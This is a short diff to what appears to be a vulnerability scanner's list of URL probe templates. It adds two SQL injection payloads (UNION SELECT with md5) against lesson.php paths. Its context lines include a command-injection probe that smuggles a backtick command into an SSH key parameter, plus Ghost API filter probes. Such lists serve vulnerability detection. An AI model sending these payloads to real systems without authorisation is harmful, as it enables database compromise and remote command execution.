@@ -497,3 +497,5 @@
 /admin/ajax.php?module=filestore&command=testconnection&driver=SSH&host=127.0.0.1&user={{prefix}}&port=22&key={{prefix}}`{{cmd}}`&path={{prefix}}
 /ghost/api/content/tags/?key={{api_key}}&filter=slug:-null
 /ghost/api/content/tags/?key={{api_key}}&filter=slug:[
+/caiwl/lesson.php?id=-1%20UNION%20SELECT%201,2,md5({{num}}),4,5
+/lesson.php?id=-1%20UNION%20SELECT%201,2,md5({{num}}),4,5
